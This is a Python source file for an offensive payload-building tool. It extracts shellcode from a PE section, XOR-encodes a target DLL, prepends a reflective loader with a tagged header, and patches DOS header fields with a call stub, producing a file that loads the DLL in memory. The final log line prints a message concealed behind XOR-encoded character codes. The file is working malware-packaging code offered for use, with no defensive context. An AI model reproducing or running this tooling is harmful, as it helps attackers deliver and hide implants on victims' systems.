from ast import parse
from genericpath import exists
import os
import hashlib
import pefile
import base64 as b64
import argparse
import logging

TAG_PAYLOAD_BEGIN = 0x4c34314e #'L41N'

REFLECTIVE_LOADER_PIC = []
CALL_REL32 = 0

# 0x41, 0x52,
CALL_REL32_64 = [
    # e_cblp
    # e_cp
    0x40, 0x80, 0xec, 0x30, # add spl 0x30

    # e_crlc
    # e_cparhdr
    # e_minalloc[0]
    0xE8, 0, 0, 0, 0, # call rel32

    # e_minalloc[1]
    # e_maxalloc
    # e_ss
    0x40, 0x80, 0xc4, 0x28 # sub spl 0x38 (remember MZ is pop r10)
 ] # total size, 14B, 7 WORD

CALL_REL32_RVA_NEG_OFFSET = len("MZ") + 9
CALL_REL32_RVA_OFFSET = 5

def write_dos_header_jmp(rva, target_pe, dos_header_instruction):
    #http://web.archive.org/web/20200806080448/http://www.csn.ul.ie/~caolan/pub/winresdump/winresdump/doc/pefile2.html
    # write the four_bytes into the old_bytes_offset
    # target_pe.set_bytes_at_offset(old_bytes_offset, four_bytes)

    if dos_header_instruction == CALL_REL32:
        data = CALL_REL32_64
        

        text_rva = rva
        rva -= CALL_REL32_RVA_NEG_OFFSET
        rva_bytes = int(rva).to_bytes(4, 'little')
        data[CALL_REL32_RVA_OFFSET:CALL_REL32_RVA_OFFSET+4] = rva_bytes
        data.append(0xc3) # adding a return
        e_cblp = int.from_bytes(data[:2], 'little')
        e_cp = int.from_bytes(data[2:4], 'little')
        e_crlc = int.from_bytes(data[4:6], 'little')
        e_cparhdr = int.from_bytes(data[6:8], 'little')
        e_minalloc = int.from_bytes(data[8:10], 'little')
        e_maxalloc = int.from_bytes(data[10:12], 'little')
        e_ss = int.from_bytes(data[12:], 'little')
        target_pe.DOS_HEADER.e_cblp = e_cblp
        target_pe.DOS_HEADER.e_cp = e_cp
        target_pe.DOS_HEADER.e_crlc = e_crlc
        target_pe.DOS_HEADER.e_cparhdr = e_cparhdr
        target_pe.DOS_HEADER.e_minalloc = e_minalloc
        target_pe.DOS_HEADER.e_maxalloc = e_maxalloc
        target_pe.DOS_HEADER.e_ss = e_ss
    return True

def get_shellcode_from_section(filename, section):
    target_pe = pefile.PE(filename)  
    for sct in target_pe.sections:
        if sct.Name.strip(b'\x00') == section.encode():
            shlc = sct.get_data()

            return shlc
    return None 

def prepend_shellcode_blob(src_filename, dest_filename, xor_key=None) -> bool:
    global REFLECTIVE_LOADER_PIC
    if REFLECTIVE_LOADER_PIC is None or len(REFLECTIVE_LOADER_PIC) == 0:
        logging.fatal("Shellcode has not been initialized!")
        return False
        
    shlc_bytes = REFLECTIVE_LOADER_PIC
    src_bytes = bytearray(open(src_filename, 'rb').read())
    if xor_key is not None:
        xor_bytes = bytes.fromhex(xor_key)
        logging.info("Using XOR key: {}".format(xor_key))
        for i in range(0, len(src_bytes)):
            src_bytes[i] ^= xor_bytes[i % len(xor_bytes)]
    else:
        logging.info("Not using xor key")
        # what the fuck is scope lmao
        xor_key = []
        xor_bytes = bytearray()
        
    logging.info("Payload length : {} bytes".format(len(src_bytes)))
    shlc_bytes += TAG_PAYLOAD_BEGIN.to_bytes(4, byteorder='little')
    shlc_bytes += len(xor_bytes).to_bytes(4, byteorder='little')
    shlc_bytes += len(src_bytes).to_bytes(4, byteorder='little')
    shlc_bytes += xor_bytes
    shlc_bytes += src_bytes
    open(dest_filename, 'wb').write(shlc_bytes)
    return True
    


def main():

    global REFLECTIVE_LOADER_PIC

    parser = argparse.ArgumentParser()
    
    parser.add_argument('-d', action='store_true', default=False, dest='debug', help='Enable debug output')
    parser.add_argument('-o', action='store', default=None, dest='outfile', required=True, help='output reflectively loading dll')
    parser.add_argument('-f', action='store', default=None, dest='target_file', required=True, help='target file to make reflectively loading')
    parser.add_argument('-s', action='store', default=None, dest='shellcode_file',required=False, help='position independent shellcode blob to use as the reflective loader')
    parser.add_argument('-pe', action='store', default=None, dest='pefile', required=False, help='PE file to extract shellcode from (must also provide section name)')
    parser.add_argument('-sct', action='store', default=None, dest="pesection", required=False, help='PE section to extract shellcode from')
    parser.add_argument('-xor', action='store', default=None, dest="xor_key", required=False, help='XOR key to encode the PE with e.g.: 41424142')
    parser.add_argument('--dump-shellcode', action='store', default=None, dest='dump_shellcode', help='Dump extracted shellcode from the provided loader file')

    args = parser.parse_args()
    
    if args.debug:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    # check target file
    target_file = args.target_file
    if os.path.exists(args.outfile):
        try:
            logging.info("removing old file")
            os.remove(args.outfile)
        except Exception as ex:
            logging.info("couldn't delete old file, please manually delete {}".format(args.outfile))
            exit(0)

    if  not os.path.exists(target_file):
        logging.fatal("Error, target file {} does not exist".format(target_file))
        exit(0)

    
    # if we are extracting shellcode from a PE, do it here
    if args.pefile is not None:
        if args.pesection is None:
            logging.fatal("Cannot get shellcode from PE without providing section name (-sct)")
            exit(0)
        
        logging.info("Using custom PE file {}".format(args.pefile))
        shlc_pe = get_shellcode_from_section(args.pefile, args.pesection)
        if shlc_pe is None:
            logging.fatal("Could not extract shellcode from {} - section {}".format(args.pefile, args.pesection))
            exit(0)
        
        logging.info("Using shellcode from file - length : {} bytes".format(len(shlc_pe)))

        REFLECTIVE_LOADER_PIC = shlc_pe
        
    if args.dump_shellcode:
        logging.info("Writing extracted shellcode to {}".format(args.dump_shellcode))
        open(args.dump_shellcode,'wb').write(shlc_pe)
        logging.info("Written...")

    if prepend_shellcode_blob(args.target_file, args.outfile, args.xor_key):
        logging.info("Wrote reflective loader and dll to payload file {}".format(args.outfile))
    else:
        logging.fatal("Failed to write to destination file")
    
    
    target_bytes = open(args.outfile, 'rb').read()
    m = hashlib.sha256()
    m.update(target_bytes)
    logging.info("Payload file SHA256: {}".format(m.hexdigest()))
    logging.info(''.join([chr(0x41 ^ x) for x in [1121, 1026, 1024, 1024, 1147, 1145, 1144, 97, 1139, 1151, 1140, 1148, 1148, 1034, 1144, 97, 1147, 1151, 1025, 1137, 1136, 1146, 1037, 109, 97, 1145, 1141, 1145, 97, 1148, 1137, 97, 1028, 1026, 1144]]))

    
if __name__ == "__main__":
    main()